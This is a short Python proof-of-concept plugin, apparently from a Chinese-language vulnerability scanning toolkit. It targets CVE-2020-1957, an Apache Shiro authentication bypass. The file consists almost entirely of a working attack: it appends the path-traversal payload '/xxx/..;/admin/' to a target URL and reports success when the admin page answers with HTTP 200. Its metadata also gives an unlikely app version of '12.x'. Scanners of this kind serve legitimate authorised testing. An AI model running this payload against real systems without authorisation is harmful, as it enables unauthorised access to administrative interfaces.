import pocs
from lib import config
import re
import requests

class POC(pocs.Pocs):

    def __init__(self):
        '''
            初始化函数
        '''
        super().__init__()
        self.poc_name='shiro 未授权访问漏洞'
        self.vul_name='shiro 未授权访问漏洞'
        self.vul_num='CVE-2020-1957'
        self.app_name='shiro'
        self.app_version='12.x'
        self.author='haochen'
        self.msg='直接访问管理页面/admin/会被重定向至登陆页面，访问/xxx/..;/admin/可绕过登陆直接进入后台'
        self.must_parameter={
            'target' : ''
        }

    def exploit(self,must_parameter,cho_parameter):
        '''
            扫描使用的函数
        '''
        url = must_parameter['target']
        self.must_parameter = must_parameter
        head = config.Pack
        self.payload='/xxx/..;/admin/'
        if re.search('/$',url):
            url=url[0:len(url)-1]
        target = url + self.payload
        try:
            response = requests.get(target,headers=head)
            if response.status_code == 200:
                self.set_cout('success','存在漏洞')
            else:
                self.set_cout('failed','不存在漏洞，网站返回值为: '+str(response.status_code) )
        except:
            self.set_cout('error','无法正确访问网站！')

    
        
